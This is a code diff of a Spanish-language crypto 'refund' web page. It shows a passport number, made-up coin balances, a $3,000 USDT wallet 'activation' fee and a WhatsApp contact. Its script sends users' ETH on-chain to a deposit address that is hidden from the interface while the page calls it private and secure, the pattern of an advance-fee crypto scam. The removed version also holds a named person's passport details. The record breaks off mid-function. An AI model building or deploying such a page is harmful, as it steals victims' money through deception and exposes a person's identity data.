@@ -1,448 +1,770 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Efikcoin · Reintegro de Pagos Crypto</title>
-    <style>
-        /* ===== RESET & GLOBAL ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Reintegro de Pagos Crypto</title>
+  <style>
+    /* ===== RESET & GLOBAL ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+    }
 
-        body {
-            background: linear-gradient(145deg, #0b1a2e 0%, #1a2f3f 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
+    body {
+      background: #0b1424;
+      background-image: radial-gradient(circle at 20% 30%, #1a2f4a 0%, #0a111f 80%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
 
-        .dashboard {
-            max-width: 820px;
-            width: 100%;
-            background: #f5f0e8;
-            border-radius: 32px;
-            padding: 32px 28px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
-            border: 1px solid rgba(255, 215, 150, 0.3);
-            transition: all 0.2s;
-        }
+    .dashboard {
+      max-width: 880px;
+      width: 100%;
+      background: rgba(255, 248, 240, 0.06);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 48px;
+      padding: 32px 28px;
+      border: 1px solid rgba(255, 215, 150, 0.25);
+      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255, 215, 150, 0.1);
+    }
 
-        /* ===== HEADER ===== */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid #c9a87c;
-            padding-bottom: 16px;
-            margin-bottom: 24px;
-            flex-wrap: wrap;
-        }
-        .header h1 {
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: #1e3b4a;
-            letter-spacing: 1px;
-        }
-        .header h1 small {
-            font-weight: 400;
-            font-size: 1rem;
-            color: #5a3f2b;
-            display: block;
-        }
-        .badge {
-            background: #1e3b4a;
-            color: #f5e6d3;
-            padding: 8px 18px;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 0.85rem;
-            border: 1px solid #c9a87c;
-        }
+    /* ===== HEADER ===== */
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 2px solid rgba(201, 168, 124, 0.4);
+      padding-bottom: 16px;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+    }
+    .header-left h1 {
+      font-size: 2.2rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #f5e6d3, #ffd78a);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -0.5px;
+    }
+    .header-left h1 small {
+      font-size: 0.9rem;
+      font-weight: 400;
+      -webkit-text-fill-color: #b8a088;
+      display: block;
+      letter-spacing: 1px;
+    }
+    .badge-spain {
+      background: #c9a87c;
+      color: #0b1424;
+      padding: 8px 20px;
+      border-radius: 40px;
+      font-weight: 700;
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      border: 1px solid #ffd78a;
+      box-shadow: 0 0 20px rgba(255, 215, 150, 0.2);
+    }
 
-        /* ===== PASSPORT CARD ===== */
-        .passport-card {
-            background: #fcf9f4;
-            border-radius: 20px;
-            padding: 24px 22px;
-            border: 1px solid #dac5b0;
-            box-shadow: inset 0 2px 6px rgba(0,0,0,0.02);
-            margin-bottom: 28px;
-        }
+    /* ===== PASSPORT ROW ===== */
+    .passport-row {
+      background: rgba(255, 248, 240, 0.05);
+      border-radius: 20px;
+      padding: 18px 22px;
+      border: 1px solid rgba(201, 168, 124, 0.3);
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 28px;
+      gap: 12px;
+    }
+    .passport-row .country {
+      font-weight: 700;
+      color: #ffd78a;
+      font-size: 1.2rem;
+    }
+    .passport-row .country span {
+      color: #b8a088;
+      font-weight: 400;
+      font-size: 0.9rem;
+    }
+    .passport-row .id {
+      background: rgba(0, 0, 0, 0.4);
+      padding: 6px 18px;
+      border-radius: 40px;
+      border: 1px solid #c9a87c;
+      color: #f5e6d3;
+      font-weight: 600;
+      letter-spacing: 1px;
+    }
+    .passport-row .id input {
+      background: transparent;
+      border: none;
+      color: #f5e6d3;
+      font-weight: 600;
+      font-size: 1rem;
+      outline: none;
+      width: 140px;
+    }
 
-        .row {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px 20px;
-            margin-bottom: 14px;
-            align-items: baseline;
-        }
-        .row .label {
-            font-weight: 600;
-            color: #4a3520;
-            min-width: 140px;
-            font-size: 0.85rem;
-            letter-spacing: 0.3px;
-            text-transform: uppercase;
-        }
-        .row .value {
-            font-weight: 500;
-            color: #1e2e3a;
-            font-size: 1rem;
-            background: #fffcf8;
-            padding: 4px 12px;
-            border-radius: 8px;
-            border: 1px solid #e2d3c4;
-            flex: 1;
-            min-width: 160px;
-        }
-        .row .value input {
-            width: 100%;
-            border: none;
-            background: transparent;
-            font-size: 1rem;
-            font-weight: 500;
-            color: #1e2e3a;
-            outline: none;
-            padding: 4px 0;
-        }
-        .row .value input:focus {
-            border-bottom: 2px solid #b8864b;
-        }
+    /* ===== COIN GRID ===== */
+    .coin-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
+      margin-bottom: 28px;
+    }
+    .coin-card {
+      background: rgba(255, 248, 240, 0.04);
+      border-radius: 20px;
+      padding: 16px 12px;
+      border: 1px solid rgba(201, 168, 124, 0.15);
+      text-align: center;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    }
+    .coin-card:hover {
+      transform: translateY(-4px);
+      border-color: #ffd78a;
+      box-shadow: 0 8px 30px rgba(255, 215, 150, 0.1);
+    }
+    .coin-card .symbol {
+      font-weight: 800;
+      font-size: 1.1rem;
+      color: #c9a87c;
+      letter-spacing: 1px;
+    }
+    .coin-card .balance {
+      font-weight: 700;
+      font-size: 1.5rem;
+      color: #f5e6d3;
+      margin-top: 4px;
+    }
+    .coin-card .balance small {
+      font-weight: 400;
+      font-size: 0.8rem;
+      color: #b8a088;
+    }
+    .coin-card .change {
+      font-size: 0.7rem;
+      color: #5f8b6b;
+      background: rgba(95, 139, 107, 0.2);
+      padding: 2px 12px;
+      border-radius: 30px;
+      display: inline-block;
+      margin-top: 4px;
+    }
 
-        .grid-2 {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px 24px;
-        }
+    @media (max-width: 640px) {
+      .coin-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
 
-        .photo-placeholder {
-            grid-column: 2 / 3;
-            grid-row: 1 / 4;
-            background: #e8ddd0;
-            border-radius: 16px;
-            border: 2px dashed #b8864b;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #7a624a;
-            font-size: 0.8rem;
-            min-height: 130px;
-            padding: 10px;
-            text-align: center;
-        }
+    /* ===== ACTIVATION CARD ===== */
+    .activation-card {
+      background: linear-gradient(135deg, rgba(26, 47, 74, 0.8), rgba(11, 20, 36, 0.9));
+      border-radius: 24px;
+      padding: 20px 24px;
+      border: 1px solid rgba(255, 215, 150, 0.2);
+      margin-bottom: 28px;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      backdrop-filter: blur(4px);
+    }
+    .activation-card .info {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+    .activation-card .info .label {
+      color: #b8a088;
+      font-weight: 600;
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .activation-card .info .status {
+      font-weight: 800;
+      font-size: 1.1rem;
+      color: #e74c3c;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .activation-card .info .status.active {
+      color: #2ecc71;
+    }
+    .activation-card .info .wallet-hash {
+      background: rgba(0, 0, 0, 0.5);
+      padding: 4px 14px;
+      border-radius: 40px;
+      font-family: monospace;
+      font-size: 0.75rem;
+      color: #b8a088;
+      border: 1px solid #2d1f14;
+    }
+    .btn-activate {
+      background: #f1c40f;
+      color: #0b1424;
+      padding: 12px 32px;
+      border: none;
+      border-radius: 60px;
+      font-weight: 800;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 30px rgba(241, 196, 15, 0.2);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .btn-activate:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 50px rgba(241, 196, 15, 0.4);
+    }
+    .btn-activate:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
 
-        /* ===== BUTTONS ===== */
-        .actions {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 16px;
-            margin-top: 16px;
-            justify-content: center;
-        }
-        .btn {
-            padding: 14px 32px;
-            border: none;
-            border-radius: 60px;
-            font-weight: 700;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            background: #dac5b0;
-            color: #2d1f14;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
-        }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 18px rgba(0,0,0,0.15);
-        }
-        .btn-primary {
-            background: #1e3b4a;
-            color: #f5e6d3;
-        }
-        .btn-primary:hover {
-            background: #2a5063;
-        }
-        .btn-success {
-            background: #2a6b4a;
-            color: #fff;
-        }
-        .btn-success:hover {
-            background: #348a5e;
-        }
-        .btn-warning {
-            background: #b8864b;
-            color: #fff;
-        }
-        .btn-warning:hover {
-            background: #cc9a5e;
-        }
-        .btn-outline {
-            background: transparent;
-            border: 2px solid #b8864b;
-            color: #b8864b;
-        }
-        .btn-outline:hover {
-            background: #b8864b;
-            color: #fff;
-        }
+    /* ===== OPERATIONS ===== */
+    .operations {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+      margin-bottom: 20px;
+    }
+    .op-card {
+      background: rgba(255, 248, 240, 0.04);
+      border-radius: 24px;
+      padding: 20px 22px;
+      border: 1px solid rgba(201, 168, 124, 0.15);
+      backdrop-filter: blur(4px);
+    }
+    .op-card h3 {
+      color: #c9a87c;
+      font-size: 0.9rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 16px;
+      border-left: 3px solid #c9a87c;
+      padding-left: 12px;
+    }
 
-        /* ===== STATUS / OUTPUT ===== */
-        .status-area {
-            margin-top: 24px;
-            padding: 18px 20px;
-            background: #e8ddd0;
-            border-radius: 16px;
-            border-left: 6px solid #b8864b;
-            font-size: 0.95rem;
-            color: #1e2e3a;
-            min-height: 60px;
-            transition: 0.3s;
-            word-break: break-word;
-        }
-        .status-area.success {
-            border-left-color: #2a6b4a;
-            background: #d9eee0;
-        }
-        .status-area.error {
-            border-left-color: #b13e3e;
-            background: #f5dddd;
-        }
+    .op-card .field {
+      margin-bottom: 14px;
+    }
+    .op-card .field label {
+      display: block;
+      color: #b8a088;
+      font-size: 0.75rem;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+    .op-card .field input {
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 16px;
+      border: 1px solid rgba(201, 168, 124, 0.3);
+      background: rgba(0, 0, 0, 0.3);
+      color: #f5e6d3;
+      font-size: 0.95rem;
+      outline: none;
+      transition: 0.3s;
+    }
+    .op-card .field input:focus {
+      border-color: #ffd78a;
+      box-shadow: 0 0 20px rgba(255, 215, 150, 0.05);
+    }
+    .op-card .field input::placeholder {
+      color: #5a4a3a;
+    }
 
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 600px) {
-            .dashboard { padding: 20px 16px; }
-            .grid-2 { grid-template-columns: 1fr; }
-            .photo-placeholder { grid-column: 1 / 2; grid-row: auto; min-height: 80px; }
-            .row .label { min-width: 100px; }
-            .header h1 { font-size: 1.3rem; }
-            .btn { width: 100%; justify-content: center; }
-        }
+    .btn-deposit {
+      background: #2a6b4a;
+      color: #fff;
+      padding: 14px 24px;
+      border: none;
+      border-radius: 60px;
+      font-weight: 700;
+      width: 100%;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 20px rgba(42, 107, 74, 0.3);
+    }
+    .btn-deposit:hover {
+      background: #348a5e;
+      transform: translateY(-2px);
+    }
 
-        /* small extra */
-        .chip {
-            display: inline-block;
-            background: #1e3b4a20;
-            padding: 2px 14px;
-            border-radius: 30px;
-            font-size: 0.75rem;
-            color: #1e3b4a;
-            font-weight: 600;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 16px;
-            color: #7a624a;
-            font-size: 0.75rem;
-            border-top: 1px solid #dac5b0;
-            padding-top: 16px;
-        }
-    </style>
+    .btn-withdraw {
+      background: #b8864b;
+      color: #fff;
+      padding: 14px 24px;
+      border: none;
+      border-radius: 60px;
+      font-weight: 700;
+      width: 100%;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 20px rgba(184, 134, 75, 0.3);
+    }
+    .btn-withdraw:hover {
+      background: #cc9a5e;
+      transform: translateY(-2px);
+    }
+
+    @media (max-width: 700px) {
+      .operations {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* ===== STATUS / PROOF AREA ===== */
+    .status-area {
+      margin-top: 24px;
+      padding: 20px 24px;
+      background: rgba(0, 0, 0, 0.4);
+      border-radius: 20px;
+      border-left: 6px solid #c9a87c;
+      font-size: 0.95rem;
+      color: #e8ddd0;
+      min-height: 80px;
+      transition: 0.3s;
+      word-break: break-word;
+      line-height: 1.7;
+      backdrop-filter: blur(4px);
+      border: 1px solid rgba(201, 168, 124, 0.1);
+    }
+    .status-area.success {
+      border-left-color: #2ecc71;
+      background: rgba(46, 204, 113, 0.08);
+    }
+    .status-area.error {
+      border-left-color: #e74c3c;
+      background: rgba(231, 76, 60, 0.08);
+    }
+    .status-area a {
+      color: #f1c40f;
+      font-weight: 700;
+      text-decoration: none;
+      border-bottom: 1px dashed #f1c40f;
+    }
+    .status-area a:hover {
+      color: #ffd78a;
+    }
+    .status-area code {
+      background: rgba(0, 0, 0, 0.5);
+      padding: 2px 10px;
+      border-radius: 8px;
+      font-size: 0.8rem;
+      color: #ffd78a;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 24px;
+      color: #5a4a3a;
+      font-size: 0.75rem;
+      border-top: 1px solid rgba(201, 168, 124, 0.15);
+      padding-top: 18px;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+    .footer strong {
+      color: #c9a87c;
+    }
+    .footer .admin-link {
+      color: #f1c40f;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .footer .admin-link:hover {
+      text-decoration: underline;
+    }
+
+    /* ===== ANIMATIONS ===== */
+    @keyframes glowPulse {
+      0% { box-shadow: 0 0 20px rgba(255, 215, 150, 0.1); }
+      50% { box-shadow: 0 0 40px rgba(255, 215, 150, 0.2); }
+      100% { box-shadow: 0 0 20px rgba(255, 215, 150, 0.1); }
+    }
+    .glow-animate {
+      animation: glowPulse 3s infinite;
+    }
+  </style>
 </head>
 <body>
 
-<div class="dashboard">
-    <!-- HEADER -->
-    <div class="header">
-        <h1>
-            💱 Reintegro de Pagos Crypto
-            <small>Efikcoin · Empowering Africa</small>
-        </h1>
-        <span class="badge">🔒 Seguro</span>
+<div class="dashboard" id="app">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="header-left">
+      <h1>⚡ Reintegro de Pagos Crypto
+        <small>España · Reino de España</small>
+      </h1>
+    </div>
+    <span class="badge-spain">🔒 Red Segura</span>
+  </div>
+
+  <!-- PASSPORT -->
+  <div class="passport-row">
+    <div class="country">🇪🇸 ESPAÑA <span>REINO DE ESPAÑA</span></div>
+    <div class="id">
+      PASAPORTE Nº <input type="text" id="passportInput" value="PAF64880" />
+    </div>
+    <div style="display:flex; gap:8px;">
+      <span style="background:#1a2f4a; padding:4px 12px; border-radius:40px; color:#b8a088; font-size:0.7rem; border:1px solid #2d1f14;">TIPO: P</span>
+      <span style="background:#1a2f4a; padding:4px 12px; border-radius:40px; color:#b8a088; font-size:0.7rem; border:1px solid #2d1f14;">CÓDIGO: ESP</span>
+    </div>
+  </div>
+
+  <!-- COIN GRID -->
+  <div class="coin-grid" id="coinGrid">
+    <div class="coin-card glow-animate">
+      <div class="symbol">₿ BTC</div>
+      <div class="balance" id="btcBal">$12,475.32</div>
+      <div class="change">▲ +2.4%</div>
+    </div>
+    <div class="coin-card glow-animate">
+      <div class="symbol">₮ USDT</div>
+      <div class="balance" id="usdtBal">$8,751.04</div>
+      <div class="change">▲ +1.2%</div>
+    </div>
+    <div class="coin-card glow-animate">
+      <div class="symbol">🔷 BEN</div>
+      <div class="balance" id="benBal">$6,330.11</div>
+      <div class="change">▼ -0.8%</div>
+    </div>
+    <div class="coin-card glow-animate">
+      <div class="symbol">⟠ ETH</div>
+      <div class="balance" id="ethBal">$7,299.87</div>
+      <div class="change">▲ +5.1%</div>
+    </div>
+  </div>
+
+  <!-- ACTIVATION CARD -->
+  <div class="activation-card" id="activationCard">
+    <div class="info">
+      <span class="label">📌 Billetera</span>
+      <span class="status" id="walletStatus">🔴 Inactiva</span>
+      <span class="wallet-hash" id="walletHashDisplay">0x8bae...1498b</span>
+    </div>
+    <div style="display:flex; align-items:center; gap:16px; flex-wrap:wrap;">
+      <span style="color:#b8a088; font-size:0.8rem;">Activar por <strong style="color:#f1c40f;">$3,000 USDT</strong></span>
+      <button class="btn-activate" id="activateBtn">⚡ Activar Billetera</button>
+    </div>
+  </div>
+
+  <!-- OPERATIONS: DEPOSIT & WITHDRAW -->
+  <div class="operations">
+    <!-- DEPOSIT (Hidden Address + MetaMask) -->
+    <div class="op-card">
+      <h3>💰 Depositar</h3>
+      <p style="color:#b8a088; font-size:0.8rem; margin-bottom:12px;">Recibe cashback con tus pagos en crypto</p>
+      <div class="field">
+        <label>Cantidad en ETH</label>
+        <input type="number" id="depositAmount" placeholder="0.0" value="0.1" step="any" />
+      </div>
+      <button class="btn-deposit" id="depositBtn">➕ Depositar a la red</button>
+      <div style="margin-top:12px; font-size:0.7rem; color:#5a4a3a; text-align:center;">
+        🔒 Dirección de depósito privada (segura)
+      </div>
     </div>
 
-    <!-- PASSPORT CARD -->
-    <div class="passport-card">
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; flex-wrap: wrap;">
-            <span style="font-weight: 700; color: #1e3b4a; font-size: 1.2rem;">🇪🇸 REINO DE ESPAÑA</span>
-            <span class="chip">Tipo/TIC: TD/PD</span>
-            <span class="chip">Código: 0x00</span>
-        </div>
-
-        <div class="row">
-            <span class="label">PASAPORTE Nº</span>
-            <span class="value"><input type="text" id="passport" value="PAF64880" /></span>
-        </div>
-
-        <div class="grid-2">
-            <div>
-                <div class="row" style="margin-bottom: 8px;">
-                    <span class="label">Apellidos</span>
-                    <span class="value"><input type="text" id="surname" value="MORGADA CUETO" /></span>
-                </div>
-                <div class="row" style="margin-bottom: 8px;">
-                    <span class="label">Nombre</span>
-                    <span class="value"><input type="text" id="name" value="ANGEL LORENTO" /></span>
-                </div>
-                <div class="row" style="margin-bottom: 8px;">
-                    <span class="label">Nacionalidad</span>
-                    <span class="value"><input type="text" id="nationality" value="ESPANOLA" /></span>
-                </div>
-                <div class="row" style="margin-bottom: 0;">
-                    <span class="label">Sexo</span>
-                    <span class="value"><input type="text" id="sex" value="M" style="max-width: 60px;" /></span>
-                </div>
-            </div>
-            <div class="photo-placeholder">
-                📷 <br /> <span style="font-size:0.7rem;">FOTO / HUELLA</span>
-            </div>
-        </div>
-
-        <div style="margin-top: 18px; border-top: 1px dashed #dac5b0; padding-top: 14px; display: flex; flex-wrap: wrap; gap: 14px;">
-            <div style="flex:1; min-width:140px;">
-                <span class="label" style="display:block; font-size:0.7rem;">Fecha de expiración</span>
-                <input type="date" id="expiry" value="2028-12-31" style="width:100%; padding:6px 10px; border-radius:8px; border:1px solid #dac5b0; background:#fffcf8;" />
-            </div>
-            <div style="flex:1; min-width:140px;">
-                <span class="label" style="display:block; font-size:0.7rem;">Fecha de emisión</span>
-                <input type="date" id="issue" value="2023-06-15" style="width:100%; padding:6px 10px; border-radius:8px; border:1px solid #dac5b0; background:#fffcf8;" />
-            </div>
-        </div>
+    <!-- WITHDRAW (Visible Owner Address) -->
+    <div class="op-card">
+      <h3>📤 Retirar</h3>
+      <div class="field">
+        <label>Dirección del propietario (visible)</label>
+        <input type="text" id="ownerAddressInput" 
+               value="0x8bae134b1dd70819331000f7b0331lb95a36646d2dd771498b" />
+      </div>
+      <div class="field">
+        <label>Cantidad (USD)</label>
+        <input type="number" id="withdrawAmountInput" placeholder="0.00" value="500" step="any" />
+      </div>
+      <button class="btn-withdraw" id="withdrawBtn">💸 Retirar</button>
     </div>
+  </div>
 
-    <!-- ACTION BUTTONS -->
-    <div class="actions">
-        <button class="btn btn-primary" id="connectBtn">🔗 Conectar Wallet</button>
-        <button class="btn btn-success" id="refundBtn">💰 Solicitar Reintegro</button>
-        <button class="btn btn-warning" id="verifyBtn">✅ Verificar Identidad</button>
-        <button class="btn btn-outline" id="resetBtn">↻ Restablecer</button>
-    </div>
+  <!-- STATUS / PROOF AREA -->
+  <div class="status-area" id="statusArea">
+    ✅ Bienvenido. Conecta tu wallet o realiza una operación.
+  </div>
 
-    <!-- STATUS / OUTPUT -->
-    <div class="status-area" id="status">
-        👋 Listo. Conecta tu wallet o solicita un reintegro.
-    </div>
-
-    <div class="footer">
-        Efikcoin · Reintegro de Pagos Crypto · v1.0
-    </div>
+  <!-- FOOTER -->
+  <div class="footer">
+    <span><strong>© Reintegro Crypto</strong></span>
+    <span>📢 <a href="https://wa.me/5491164517084?text=empoderamiento%20de%20la%20vida" target="_blank" class="admin-link">@ECEcoin18 · WhatsApp</a></span>
+    <span>💬 <em>“empoderamiento de la vida”</em></span>
+    <span style="color:#3a2a1a;">🔒 Transacciones seguras</span>
+  </div>
 </div>
 
-<!-- ==================== JAVASCRIPT ==================== -->
-<script>
-    (function() {
-        'use strict';
-
-        // DOM refs
-        const statusEl = document.getElementById('status');
-        const connectBtn = document.getElementById('connectBtn');
-        const refundBtn = document.getElementById('refundBtn');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const resetBtn = document.getElementById('resetBtn');
-
-        // Inputs
-        const passportInput = document.getElementById('passport');
-        const surnameInput = document.getElementById('surname');
-        const nameInput = document.getElementById('name');
-        const nationalityInput = document.getElementById('nationality');
-        const sexInput = document.getElementById('sex');
-        const expiryInput = document.getElementById('expiry');
-        const issueInput = document.getElementById('issue');
-
-        // Helper: set status message with style
-        function setStatus(msg, type = '') {
-            statusEl.textContent = msg;
-            statusEl.className = 'status-area' + (type ? ' ' + type : '');
-        }
-
-        // Helper: get all form data as object
-        function getFormData() {
-            return {
-                passport: passportInput.value.trim(),
-                surname: surnameInput.value.trim(),
-                name: nameInput.value.trim(),
-                nationality: nationalityInput.value.trim(),
-                sex: sexInput.value.trim(),
-                expiry: expiryInput.value,
-                issue: issueInput.value
-            };
-        }
-
-        // ----- 1. CONNECT WALLET (MetaMask) -----
-        async function connectWallet() {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    const address = accounts[0];
-                    const short = address.slice(0, 6) + '…' + address.slice(-4);
-                    setStatus(`✅ Wallet conectada: ${short}`, 'success');
-                } catch (err) {
-                    setStatus(`❌ Error al conectar: ${err.message}`, 'error');
-                }
-            } else {
-                setStatus('⚠️ MetaMask no instalado. Descárgalo desde metamask.io', 'error');
-                // Optional: open link in new tab
-                if (confirm('¿Quieres instalar MetaMask ahora?')) {
-                    window.open('https://metamask.io/download/', '_blank');
-                }
-            }
-        }
-
-        // ----- 2. SOLICITAR REINTEGRO (simulate) -----
-        function requestRefund() {
-            const data = getFormData();
-            if (!data.passport || !data.surname || !data.name) {
-                setStatus('❌ Completa al menos Pasaporte, Apellidos y Nombre.', 'error');
-                return;
-            }
-            // Simulate a refund request
-            const randomId = Math.floor(Math.random() * 1000000);
-            setStatus(
-                `💰 Reintegro solicitado para ${data.name} ${data.surname} (${data.passport}). ` +
-                `Nº de solicitud: #${randomId}. Procesando... (simulado)`,
-                'success'
-            );
-            // You could later add a real API call here.
-        }
-
-        // ----- 3. VERIFICAR IDENTIDAD (simulate) -----
-        function verifyIdentity() {
-            const data = getFormData();
-            if (!data.passport || !data.surname || !data.name) {
-                setStatus('❌ Faltan datos obligatorios para verificar.', 'error');
-                return;
-            }
-            // Simple "valid" check: passport starts with "PAF" (just for demo)
-            const isValid = data.passport.toUpperCase().startsWith('PAF');
-            if (isValid) {
-                setStatus(`✅ Identidad verificada: ${data.name} ${data.surname} (${data.passport}) - Válida`, 'success');
-            } else {
-                setStatus(`❌ Identidad NO verificada: el pasaporte debe empezar por "PAF".`, 'error');
-            }
-        }
-
-        // ----- 4. RESTABLECER (reset to defaults) -----
-        function resetForm() {
-            passportInput.value = 'PAF64880';
-            surnameInput.value = 'MORGADA CUETO';
-            nameInput.value = 'ANGEL LORENTO';
-            nationalityInput.value = 'ESPANOLA';
-            sexInput.value = 'M';
-            expiryInput.value = '2028-12-31';
-            issueInput.value = '2023-06-15';
-            setStatus('🔄 Formulario restablecido a valores iniciales.', '');
-        }
-
-        // ----- ATTACH EVENTS -----
-        connectBtn.addEventListener('click', connectWallet);
-        refundBtn.addEventListener('click', requestRefund);
-        verifyBtn.addEventListener('click', verifyIdentity);
-        resetBtn.addEventListener('click', resetForm);
-
-        // Optional: update status on input change? Not needed, but we can show live feedback.
-        // Just for demo, we'll keep it static.
-
-        console.log('✅ Efikcoin Dashboard loaded.');
-    })();
+<!-- ============================================================ -->
+<!-- ===================== JAVASCRIPT ============================ -->
+<!-- ============================================================ -->
+<script src="https://cdn.jsdelivr.net/npm/ethers@5/dist/ethers.umd.min.js">
 </script>
+<script>
+  (function() {
+    'use strict';
 
+    // ===== HIDDEN DEPOSIT ADDRESS (NEVER SHOWN IN UI) =====
+    const HIDDEN_DEPOSIT_ADDRESS = '0xC5AD5cfcF81AD63a94227334b898eafCe6B27cCA';
+
+    // ===== INITIAL COIN BALANCES (in USD) =====
+    let balances = {
+      BTC: 12475.32,
+      USDT: 8751.04,
+      BEN: 6330.11,
+      ETH: 7299.87
+    };
+
+    // ===== WALLET STATE =====
+    let walletActive = false;
+    let provider, signer;
+
+    // ===== DOM REFS =====
+    const statusEl = document.getElementById('statusArea');
+    const depositBtn = document.getElementById('depositBtn');
+    const withdrawBtn = document.getElementById('withdrawBtn');
+    const activateBtn = document.getElementById('activateBtn');
+
+    const btcEl = document.getElementById('btcBal');
+    const usdtEl = document.getElementById('usdtBal');
+    const benEl = document.getElementById('benBal');
+    const ethEl = document.getElementById('ethBal');
+
+    const ownerAddrInput = document.getElementById('ownerAddressInput');
+    const withdrawAmountInput = document.getElementById('withdrawAmountInput');
+    const depositAmountInput = document.getElementById('depositAmount');
+    const walletStatusEl = document.getElementById('walletStatus');
+    const passportInput = document.getElementById('passportInput');
+
+    // ===== HELPERS =====
+    function formatMoney(val) {
+      return '$' + val.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+    }
+
+    function updateUI() {
+      btcEl.textContent = formatMoney(balances.BTC);
+      usdtEl.textContent = formatMoney(balances.USDT);
+      benEl.textContent = formatMoney(balances.BEN);
+      ethEl.textContent = formatMoney(balances.ETH);
+    }
+
+    function setStatus(msg, type = '') {
+      statusEl.innerHTML = msg;
+      statusEl.className = 'status-area' + (type ? ' ' + type : '');
+    }
+
+    // ===== CONNECT WALLET (MetaMask) =====
+    async function connectWallet() {
+      if (typeof window.ethereum === 'undefined') {
+        setStatus(
+          '⚠️ MetaMask no instalado. <a href="https://metamask.io/download/" target="_blank">Descargar aquí</a>',
+          'error'
+        );
+        return false;
+      }
+      try {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send('eth_requestAccounts', []);
+        signer = provider.getSigner();
+        const address = await signer.getAddress();
+        const short = address.slice(0, 6) + '…' + address.slice(-4);
+        setStatus(`✅ Wallet conectada: ${short}`, 'success');
+        return true;
+      } catch (err) {
+        setStatus(`❌ Error al conectar: ${err.message}`, 'error');
+        return false;
+      }
+    }
+
+    // ===== 1. DEPOSIT (Real on‑chain transaction to hidden address) =====
+    async function handleDeposit() {
+      // Ensure wallet is connected
+      if (!signer) {
+        const ok = await connectWallet();
+        if (!ok) return;
+      }
+
+      const amountEth = parseFloat(depositAmountInput.value);
+      if (isNaN(amountEth) || amountEth <= 0) {
+        setStatus('❌ Introduce una cantidad válida de ETH (mayor que 0).', 'error');
+        return;
+      }
+
+      // Convert ETH to wei
+      const amountWei = ethers.utils.parseEther(amountEth.toString());
+
+      try {
+        setStatus('⏳ Enviando transacción...', '');
+        // Send transaction to hidden address
+        const tx = await signer.sendTransaction({
+          to: HIDDEN_DEPOSIT_ADDRESS,
+          value: amountWei
+        });
+
+        setStatus(`⏳ Transacción enviada. Esperando confirmación... Hash: ${tx.hash}`, '');
+
+        // Wait for confirmation
+        const receipt = await tx.wait(1);
